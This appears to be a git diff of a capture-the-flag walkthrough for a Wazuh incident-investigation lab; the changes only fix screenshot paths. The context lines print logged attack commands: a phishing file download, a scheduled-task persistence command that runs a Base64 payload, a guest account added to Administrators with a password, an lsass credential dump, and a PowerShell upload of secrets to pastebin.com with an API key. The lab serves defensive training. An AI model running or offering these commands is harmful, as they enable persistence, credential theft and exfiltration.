@@ -27,8 +27,8 @@ The incident involves a phishing attack that downloaded a malicious file, establ
 ```
 "powershell.exe" & {$url = 'http://localhost/SwiftSpend_Financial_Expenses.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}
 ```
-![PowerShell Download Event](1.png)
-![Wazuh Dashboard](2.png)
+![PowerShell Download Event](./screenshots/1.png)
+![Wazuh Dashboard](./screenshots/2.png)
 
 **Answer**: The file saved on the host is `SwiftSpend_Financial_Expenses.xlsm`.
 
@@ -45,8 +45,8 @@ The incident involves a phishing attack that downloaded a malicious file, establ
 ```
 "cmd.exe" /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34"
 ```
-![Scheduled Task Logs](3.png)
-![Scheduled Task Details](4.png)
+![Scheduled Task Logs](./screenshots/3.png)
+![Scheduled Task Details](./screenshots/4.png)
 
 **Answer**: The full command is:
 ```
@@ -73,8 +73,8 @@ cmd.exe /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3
 
 **Finding**: Decoded using a Base64 decoder, the data translates to `ping www.youarevulnerable.thm`.
 
-![Base64 Decoder Output](6.png)
-![Wazuh Log Analysis](7.png)
+![Base64 Decoder Output](./screenshots/6.png)
+![Wazuh Log Analysis](./screenshots/7.png)
 
 **Answer**: The encoded data decodes to `ping www.youarevulnerable.thm`.
 
@@ -92,8 +92,8 @@ cmd.exe /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3
 "C:\Windows\system32\net.exe" localgroup Administrators guest /add
 "C:\Windows\system32\net.exe" user guest I_AM_M0NIT0R1NG
 ```
-![User Account Creation](8.png)
-![Guest Account Password](9.png)
+![User Account Creation](./screenshots/8.png)
+![Guest Account Password](./screenshots/9.png)
 
 **Answer**: The password for the new user account is `I_AM_M0NIT0R1NG`.
 
@@ -109,7 +109,7 @@ cmd.exe /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3
 ```
 "C:\Tools\AtomicRedTeam\atomics\T1003.001\bin\x64\memotech.exe" "sekurlsa::minidump C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP" "sekurlsa::logonpasswords full" exit
 ```
-![Credential Dumping Event](11.png)
+![Credential Dumping Event](./screenshots/11.png)
 
 **Answer**: The executable used is `memotech.exe`.
 
@@ -126,7 +126,7 @@ cmd.exe /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3
 ```
 "powershell.exe" & {$apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0" $content = "secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem..." $url = "https://pastebin.com/api/api_post.php" $postData = @{ api_dev_key = $apiKey api_option = "paste" api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host "Your paste URL: $response"}
 ```
-![Data Exfiltration Log](12.png)
+![Data Exfiltration Log](./screenshots/12.png)
 
 **Answer**: The flag is `THM{M0N1T0R_1$_1N_3FF3CT}`.
 
